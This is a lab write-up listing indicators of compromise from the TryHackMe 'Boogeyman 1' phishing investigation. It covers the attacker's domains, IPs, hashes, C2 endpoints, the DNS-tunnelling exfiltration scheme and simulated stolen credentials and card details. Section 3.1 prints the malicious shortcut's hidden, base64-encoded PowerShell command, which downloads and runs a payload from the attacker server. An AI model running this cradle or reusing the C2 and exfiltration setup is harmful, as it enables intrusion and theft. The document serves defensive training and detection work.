# Boogeyman 1 — Indicators of Compromise (IOCs)

**Case Reference:** `INC-2023-0113-BGM1`  
**Classification:** Public portfolio write-up (TryHackMe training lab)  
**Target Organization:** Quick Logistics LLC  

> Lab disclaimer: TryHackMe Boogeyman 1, all data simulated. Full context in [`report.md`](report.md).

This document catalogs all verified Indicators of Compromise (IOCs), threat infrastructure, malicious artifacts, stolen credentials, and compromised financial assets identified across the Boogeyman 1 investigation.

---

## 1. Master Indicator Summary Table

| Indicator Type | Observable / Value | Classification | Context / Detection Role |
|---|---|---|---|
| **Domain** | `bpakcaging.xyz` | Malicious | Typosquatted Lookalike Domain (`bpackaging.xyz`) & DNS Exfil Suffix |
| **Domain** | `files.bpakcaging.xyz` | Malicious | Stage-2 Payload Delivery Server (`/update`, `sb.exe`, `sq3.exe`) |
| **Domain** | `cdn.bpakcaging.xyz` | Malicious | Interactive In-Memory C2 Polling Server (Port 8080) |
| **Domain** | `tracking.bpakcaging.xyz` | Suspicious | Phishing Read-Receipt Tracking Domain |
| **IPv4 Address** | `159.89.205.40` | Malicious | C2 Server IP resolving `cdn.bpakcaging.xyz` |
| **IPv4 Address** | `167.71.211.113` | Malicious | Payload Server (`files.bpakcaging.xyz`) & Rogue DNS Exfil Receiver |
| **IPv4 Address** | `15.235.99.80` | Suspicious | Elastic Email Relay Outbound MTA (`pa80.mxout.mta1.net`) |
| **Email Address** | `agriffin@bpakcaging.xyz` | Malicious | Threat Actor Phishing Sender Identity |
| **File (SHA-256)** | `b55ee53b18871f811f5a4ec405cd70de6b3f1f7cf28712ab5cb5186cbf551e87` | Malicious | Encrypted Phishing Attachment Archive (`Invoice.zip`) |
| **File (SHA-256)** | `86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8` | Malicious | Weaponized Excel Shortcut (`Invoice_20230103.lnk`) |
| **File (SHA-256)** | `b5e4f249800d741ee62d57113d00deabd634136ee6378e51c2b75c166f1833f4` | Compromised Asset | Carved KeePass 2.x Database (`protected_data_carved.kdbx`) |
| **Server Header** | `Server: SimpleHTTP/0.6 Python/3.10.7` | Malicious | Attacker Python Payload Server Banner on Port 80 |
| **HTTP Header** | `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489` | Malicious | C2 Beacon Session Identification Header |
| **C2 URI Path** | `http://cdn.bpakcaging.xyz:8080/8cce49b0` | Malicious | Initial C2 Registration / Handshake Endpoint |
| **C2 URI Path** | `http://cdn.bpakcaging.xyz:8080/b86459bb` | Malicious | Command Polling Endpoint (GET) |
| **C2 URI Path** | `http://cdn.bpakcaging.xyz:8080/27fe2489` | Malicious | Command Output Exfiltration Endpoint (POST) |
| **Payload URI** | `http://files.bpakcaging.xyz/update` | Malicious | Stage-2 In-Memory PowerShell Cradle Implant |
| **Payload URI** | `http://files.bpakcaging.xyz/sb.exe` | Malicious | Compiled Seatbelt Host Reconnaissance Binary |
| **Payload URI** | `http://files.bpakcaging.xyz/sq3.exe` | Malicious | SQLite Command-Line Binary for Sticky Notes Dumping |
| **Credential** | `%p9^3!lL^Mz47E2GaT^y` | Compromised Secret | Julianne Westcott's KeePass Master Password |
| **Financial Asset**| `4024007128269551` | Compromised Asset | Quick Logistics LLC Corporate Credit Card (CVV: 970, Exp: 3/2028) |

---

### Evidence File Hashes (not IOCs: lab evidence integrity only)

| File | SHA-256 |
|---|---|
| `dump.eml` | `4cdd0a2f16a9e1578b5c3419eeac9c403f7dce86b12fb3b821e19ce5f534c1fc` |
| `powershell.json` | `71075589408ec06e3150a399461556eb55029ae1d3f8fc0f30bcf1bbe821c02d` |
| `capture.pcapng` | `15dba24f3d9ef38dfbe0e33f995d0f8e60aa4f34ced5031c904281028e4f4bab` |

---

## 2. Network Infrastructure & C2 Indicators

### 2.1 C2 Polling Infrastructure
* **Host / Domain:** `cdn.bpakcaging.xyz`
* **Resolved IP Address:** `159.89.205.40`
* **Port:** `8080` (HTTP)
* **Polling Interval:** 0.8 seconds (`sleep 0.8`)
* **Transport Characteristics:**
  * Request header `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489`
  * HTTP GET to `/b86459bb` for receiving instructions
  * HTTP POST to `/27fe2489` for transmitting execution outputs
  * Payload encoded as space-delimited decimal ASCII integers (`[System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' '`)

### 2.2 Payload Delivery Server
* **Host / Domain:** `files.bpakcaging.xyz`
* **Resolved IP Address:** `167.71.211.113`
* **Port:** `80` (HTTP)
* **Server Banner:** `SimpleHTTP/0.6 Python/3.10.7`
* **Delivered Binaries & Implants:**
  * `/update` (PowerShell in-memory C2 agent)
  * `/sb.exe` (Seatbelt host enumeration utility)
  * `/sq3.exe` (SQLite CLI utility)

### 2.3 DNS Tunneling Exfiltration Channel
* **Rogue Authoritative Nameserver IP:** `167.71.211.113`
* **Query Type:** Standard DNS `A` records (`nslookup -q=A`)
* **Domain Suffix:** `.bpakcaging.xyz`
* **Tunneling Structure:**
  * Encoded data placed in the leftmost subdomain label: `<50-hex-characters>.bpakcaging.xyz`
  * Total Chunks: 89 sequential hexadecimal chunks
  * Total Characters: 4,412 hexadecimal characters
  * Reconstructed Binary: 2,206 bytes (`protected_data.kdbx`)

---

## 3. Host Artifacts & Malicious Files

### 3.1 Initial Delivery Shortcut
* **Filename:** `Invoice_20230103.lnk`
* **SHA-256:** `86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8`
* **Masqueraded Icon:** `C:\Users\Administrator\Desktop\excel.ico`
* **Execution Flags:** `Show Minimized No Activate`
* **Command Line Payload:**
```powershell
\WindowsPowerShell\v1.0\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

### 3.2 Targeted Endpoint Datastores
* **Sticky Notes Database:**
  `C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
* **KeePass Database Vault:**
  `C:\Users\j.westcott\Documents\protected_data.kdbx`

---

## 4. Compromised Secrets & Assets

### 4.1 Master Password
* **Plaintext:** `%p9^3!lL^Mz47E2GaT^y`
* **Context:** Saved inside Microsoft Sticky Notes (`plum.sqlite` note `ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab` under `Master Password`)

### 4.2 Corporate Credit Card
* **Vault Entry:** `Homebanking/Company Card`
* **Account Name:** Quick Logistics LLC
* **Card Number:** `4024007128269551`
* **Expiration Date:** `3/2028`
* **CVV / Security Code:** `970`
* **Entry UUID:** `{9b5464ad-7bae-c145-adbd-b13d867f4f85}`
